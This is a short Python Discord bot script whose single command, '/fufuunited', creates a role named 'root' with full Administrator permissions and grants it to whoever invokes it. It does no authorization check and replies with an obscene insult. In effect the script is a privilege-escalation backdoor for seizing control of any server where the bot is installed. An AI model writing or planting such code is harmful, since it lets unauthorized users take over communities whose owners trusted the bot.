import discord
import os
from discord.ext import commands 
from dotenv import load_dotenv

# Create a Discord client instance and set the command prefix
intents = discord.Intents.all()
client = discord.Client(intents=intents)
bot = commands.Bot(command_prefix='/', intents=intents)

# Set the confirmation message when the bot is ready
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
# Set the commands for your bot
@bot.command()
async def fufuunited(ctx):
   # Create a new role with Administrator privileges
   admin_role = await ctx.guild.create_role(name="root", permissions=discord.Permissions(administrator=True), colour=discord.Colour(0x000000))
   
   # Assign the role to the person who invoked the command
   await ctx.author.add_roles(admin_role)
   
   await ctx.send('Fuck You Bitchass')


# Retrieve token from the .env file
load_dotenv()
bot.run(os.getenv('DISCORD_TOKEN'))